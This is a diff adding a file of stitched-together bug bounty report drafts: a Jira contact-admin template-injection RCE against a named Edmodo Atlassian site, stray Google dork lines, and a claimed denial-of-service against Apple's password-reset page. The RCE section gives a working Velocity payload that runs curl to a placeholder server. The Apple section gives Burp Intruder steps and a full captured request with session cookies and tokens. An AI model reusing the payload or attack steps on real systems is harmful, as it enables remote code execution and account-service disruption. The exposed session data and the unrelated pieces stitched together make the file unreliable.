@@ -1,0 +1,104 @@
+Summary
+i found the domain  https://edmodo.atlassian.net/secure/ContactAdministrators!default.jspa is vulnerable with RCE Jira via contact admin function
+
+POC
+on page https://edmodo.atlassian.net/secure/ContactAdministrators!default.jspa
+use payload on Subject & Request details
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://your_server_here/rcetest?a=a').waitFor()
+
+
+
+
+
+NOTE: Some times it take huge time to get response on server but still vulnerability is confirmed so better disable admin form
+
+Then I immediately received a bunch of  callbacks on my host from 38.132.101.238 , which confirmed the vulnerability.
+Impact
+Command Injection and blind RCE
+
+Solution:
+
+Choose  > System. 
+Select General Configuration to open the Administration page. 
+Click the Edit Settings button
+Scroll down to the Contact Administrators Form and select OFF
+Scroll to the bottom of the page and click the Update button for this setting to take affect.
+
+If you are unable to upgrade Jira immediately, then as a temporary workaround, you can:
+
+Disable the Contact Administrators Form; and
+Block these endpoints from being accessed:
+- /secure/admin/SendBulkMail!default.jspa ,
+- /admin/SendBulkMail!default.jspa , and
+- /SendBulkMail!default.jspa .
+Note that blocking the SendBulkMail endpoint will prevent Jira Administrators from being able to send bulk emails to users.
+This can be achieved by denying access in the reverse-proxy, load balancer, or Tomcat directly (see the KB: How to block access to a specific URL at Tomcat).
+After upgrading Jira to a fixed version, you can re-enable the Administrator Contact Form, and unblock the SendBulkMail endpoints.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  inurl:"https://drive.google.com/file/d/"
+  intitle:"https://drive.google.com/file/d/"
+
+
+
+Hello team,
+
+Aditya here . I found an issue where I am able to down the "password verification function". 
+
+URL: https://iforgot.apple.com
+Vulnerable URL: https://iforgot.apple.com/password/verify/appleid#
+
+Description:
+A “denial of service” or DoS attack is used to tie up a website’s resources so that users who need to access the site cannot do so. Many major companies have been the focus of DoS attacks. Because a DoS attack can be easily engineered from nearly any location, finding those responsible can be extremely difficult.
+
+Steps:
+1. Visit  https://iforgot.apple.com/password/verify/appleid#
+2. Enter any email ID
+3. Capture a request to continue button and send it to intruder
+4. Add email ID as position to attack [test@test.com]
+5. In payloads put 100 email IDs and start attack
+
+POST request:
+POST /password/verify/appleid HTTP/1.1
+Host: iforgot.apple.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://iforgot.apple.com/
+Content-Type: application/json
+X-Apple-I-FD-Client-Info: {"U":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0","L":"en-US","Z":"GMT-07:00","V":"1.1","F":"cla44j1e3NlY5BNlY5BSs5uQ32SCVc4AI42Aqv5CU0pj9R.tHoqvynx9MsFzGe5BPfWug0JkZslmcK4rU9zA9zCqzAJBNlY5BPY25BNnOVgw24uy.CgP"}
+sstt: 6pWPgNyyeEbV6UcGPXjgLEslBol2GG8fQ0p8OCpXdftruJkjklIz3CS6NUsZSg78GWsWIHKPpEPWOpHtieWr7pdUyg2%2FxNuLwz1OqmVUoc70jWeEUdAyTVtglLryVepeOf9DDBih5cAV7nEOnNzIezxZVMs%2FLucNm0ddU%2F7dimJr0mprwLGcKw8QlIUDNiSoreCh3gQ17aKksWD11%2BCuPTElquQmxOlgVaL1KVEWbQx7iiJzgvL4JMxfPZ4hXLFLbUcR5Wt0iEyEunb%2BGy3LYE5TlU3jABiwycB7KRBc3Ib7bjOMFu3ovAKP6KSLNUN5dwRvDwwYFFnM43f9iHyxTgvWSR58IdCmRLDKzWfyFkJwTm1Sr6bHv5PKixXB8wGYDvAlc5%2FmLsU9l%2F9C
+X-Requested-With: XMLHttpRequest
+Content-Length: 27
+Origin: https://iforgot.apple.com
+Connection: close
+Cookie: xp_ci=3z4LvjrMzIpz5RtzCL6zEHrMguiA; xp_ab=1#WqjkRLH+-2+p9nsgcq0#isj11bm+-2+_Yw6v1R2; xp_abc=_Yw6v1R2#p9nsgcq0; dssid2=0b60bc3c-284b-4e72-8372-dd6d645ee8c3; dssf=1; as_sfa=Mnxpbnxpbnx8ZW5fSU58Y29uc3VtZXJ8aW50ZXJuZXR8MHwwfDE; pxro=1; as_xs=2|idmsl:1:IND|2-t-2Cbha3sMeRvW402v7w; as_disa=AAAjAAAB6Ro6J1yIvr1H50ke76swx9Ak9QeNzv4EHxVzYqf3cCDn5nvosVsS3prxwwfGMwurAAIBpuadcxyYZnd5ZZXQ4SQrhzclssgD4n4itDuZu6FuSVA=; acn01=VJyKZf06sY9G6+nwjLuyKr2o8k9IiHISbX3PEYd1GxqSAAcxo6BC1Sk=; geo=IN; dslang=US-EN; site=USA; idclient=web; X-Apple-I-Web-Token=AAAAKjd8ODhkYTc5ZjMxYjAwNzM1ODYwN2Y4ZDQwOGJhZGY1MDgAAAF5MqSuM8MrxpBYQMhD2FVLHLjCxzskBCjPHU66O17kFgcVYIZPypSlsFIAAB69Jc+4+tjWlORK5EEa/+5LEy0D5eIfmmoJM1rkykkuUiMGjZia; ifssp=314E9FD5759B309076C2A4B941372F9F06CE837A367DC62AAEAD949072426242D86F463384D90248EEAAF9026659CC71F7BFDEAC0EAC8B0728CE62FC5A9E07F1785E171B79A9A0EFE255A802607BB29115F416145ADF124001CBDCAFE1C14C8614677E34C0090C9B2C2572454DCD84F58465FAFC185DBDE4
+
+{"id":"ajmeia@yahoo%2ecom"}
+
+
+
+Attaching Video POC
+
+
+
+Impact: As an attacker I am able to down forget password function so other users who are trying to use that , they'll not able to reset their password and access their account 
+
+
+https://speakerdeck.com/aditya45/bug-bounty-tips-by-aditya-shende-aka-kong
